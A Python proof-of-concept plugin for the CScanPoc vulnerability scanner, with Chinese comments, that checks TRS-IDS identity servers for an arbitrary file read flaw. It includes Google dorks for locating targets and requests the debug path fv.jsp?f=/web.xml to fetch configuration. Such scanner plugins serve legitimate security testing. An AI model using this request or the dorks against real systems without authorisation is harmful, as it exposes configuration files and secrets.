# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TRS-IDS_0004'  # 平台漏洞编号，留空
    name = '拓尔思身份服务器系统 文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2013-10-15'  # 漏洞公布时间
    desc = '''
        拓尔思身份服务器系统实现各种应用系统间跨域的单点登录和统一的身份管理功能。提供与第三方协作应用系统集成的框架以及非常便捷的二次开发接口。
        拓尔思身份服务器系统存在任意文件读取漏洞。
        google dork: intitle:trs身份 / intitle:trs+inurl:ids
        ids/admin/debug/fv.jsp?f=/web.xml
    '''  # 漏洞描述
    ref = 'http://reboot.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TRS-IDS(拓尔思身份服务器系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '21872c9b-fbcf-4405-bb39-f8c418060b99'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2013-039729
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/ids/admin/debug/fv.jsp?f=/web.xml'
            code, head, res, err, _ = hh.http(url)
            # print code, res
            if(code == 200) and ('<?xml version' in res):
                #security_hole('任意文件读取' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
